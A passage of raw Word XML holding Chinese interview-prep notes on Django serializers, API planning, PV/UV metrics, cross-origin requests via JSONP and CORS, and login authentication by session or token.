        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.ForeignKey source=orm 操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CCD1D36" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#3.ManyToManyFiled  SerializerMethodField()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E67152" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#                    def get_字段名():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26EF9D14" w14:textId="6FC775EC" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#                    return 自定义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5169CF26" w14:textId="183D5A0F" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00F35EA5"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051</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>给用户提供一个接口之前需要提前做什么</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="633CB833" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.跟前端进行和交互,确定前端要什么</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B97AD5" w14:textId="4F6B7FCE" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.把需求写个文档保存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DA9EB62" w14:textId="62DB1D31" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="000A3959"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052</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>PV</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>UV</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB7FCAB" w14:textId="68F4E03B" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.pv:页面访问量,</w:t>
      </w:r>
      <w:r w:rsidR="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>每</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>打开一次页面PV计算+1,页面刷新也是</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="666B0905" w14:textId="6177F60F" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.UV：独立访问数,一台电脑终端为一个访客</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD7498C" w14:textId="6B1F8041" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="000A3959"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053</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>什么是跨域以及解决方法</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A2D43D3" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#跨域：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="058F9F77" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 浏览器从一个域名的网页去请求另一个域名的资源时,浏览器处于安全的考虑,不允许不同源的请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E55957" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#同源策略：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A158E4" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#  协议相同</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76DBE716" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#  域名相同</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3D2309" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#  端口相同</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D760DC6" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#处理方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14FB485D" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 1.通过JSONP跨域</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0713CCB0" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># JSON是一种数据交换格式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DA0388F" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># JSONP是一种非官方的跨域数据交互协议</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A67767" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># jsonp是包含在函数调用中的json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B3F7FC3" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># script标签不受同源策略的影响，手动创建一个script标签,传递URL,同时传入一个回调函数的名字</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E153169" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 服务器得到名字后,返回数据时会用这个函数名来包裹住数据,客户端获取到数据之后，立即把script标签删掉</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E154D40" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 2.cors：跨域资源共享</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="124194BA" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 使用自定义的HTTP头部允许浏览器和服务器相互通信</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F35C70" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 1.如果是简单请求,直接设置允许访问的域名：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B2E2FB9" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>#   允许你的域名来获取我的数据                         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E98993" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#   response['Access-Control-Allow-Origin'] = "*"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4F9D2E" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 2.如果是复杂请求,首先会发送options请求做预检,然后再发送真正的PUT/POST....请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="084D99D9" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#   因此如果复杂请求是PUT等请求,则服务端需要设置允许某请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2413CCC9" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#   如果复杂请求设置了请求头，则服务端需要设置允许某请求头</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A40247" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#简单请求：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF82DAA" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">#    一次请求 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57FCC4B9" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#非简单请求：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1713D1B0" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    两次请求，在发送数据之前会先发一次请求用于做“预检”，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6016AA" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    只有“预检”通过后才再发送一次请求用于数据传输。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77526DC4" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3049FBB4" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#只要同时满足以下两大条件，就属于简单请求。                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2149F9D7" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># (1) 请求方法是以下三种方法之一：HEAD  GET POST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E027197" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># (2)HTTP的头信息不超出以下几种字段：                                     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECC8872" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#   Accept                                     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="779B480A" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#   Accept-Language                                     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B27A48A" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#   Content-Language</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AE0142E" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#   Last-Event-ID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6172FE94" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">#  Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、 text/plain </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139D53C0" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#JSONP和CORS：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15A2BA61" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#   1.JSONP只能实现GET请求，而CORS支持所有类型的HTTP请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED4D59C" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#   2.jsonp需要client和server端的相互配合</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56160FD4" w14:textId="4547878B" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#   3.cors在client端无需设置，server端需要针对不同的请求，来做head头的处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276A190D" w14:textId="1364040A" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="000A3959"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054</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如何实现用户的登陆认证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C4FC3D1" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.cookie session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B17F655" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.token 登陆成功后生成加密字符串</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3151C058" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
